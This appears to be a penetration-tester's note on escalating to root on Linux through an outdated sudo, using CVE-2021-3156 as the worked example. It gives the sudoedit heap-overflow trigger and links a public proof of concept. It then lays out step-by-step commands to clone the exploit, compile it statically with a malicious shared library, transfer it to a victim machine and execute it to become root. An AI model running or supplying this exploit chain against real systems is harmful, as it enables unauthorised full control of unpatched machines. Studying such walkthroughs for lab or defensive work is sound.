
### Overview
---
While much less common, this method can still occasionally offer an avenue of escalation.  If the ``sudo`` version is old enough, sometimes you can find known overflow vulnerabilities for privilege escalation.


### Exploitation Example
---
- Check sudo version for potential to reference potential known exploits
```shell
sudo -V
searchsploit sudo
```

**Example CVE:**
- CVE-2021-3156: Sudo Heap Overflow Vulnerability
- POC: https://github.com/r4j0x00/exploits/tree/master/CVE-2021-3156_one_shot

The flaw was introduced in July 2011 and affects all legacy versions from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1, in their default configuration.

```
sudoedit -s '\' `perl -e 'print "A" x 65536'`
```

**Walkthrough:**
```shell
### On Victim ###

# Check sudo version
sudo -V
...
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
...

# Verify Host is Vulnerable to CVE-2021-3156
sudoedit -s '\' `perl -e 'print "A" x 65536'`
# If you receive a usage or error message, sudo is not vulnerable. 
# If the result is a Segmentation fault, sudo is vulnerable.
```

```shell
### On Attacker ###
git clone https://github.com/r4j0x00/exploits
cd exploits/CVE-2021-3156_one_shot
cat Makefile
```
![[Pasted image 20230528145554.png]]

To avoid dependency issues, we'll need to compile the exploit statically instead of just using the ``Makefile``.

```shell
# Statically compile Exploit and Compress for Trasfer to Victim
gcc -static exploit.c -o exploit
mkdir libnss_X
gcc -g -fPIC -shared sice.c -o libnss_X/X.so.2
tar -czvf exploit.tar.gz exploit libnss_X/
```
![[Pasted image 20230528145904.png]]

Once the exploit is compressed, move the archive to the victim machine in whatever way you want, expand it, and execute it to elevate to ``root``

```shell
### On Victim ###

# Expand archive and exploit
tar -xzvf exploit.tar.gz
./exploit

# You are now root
```
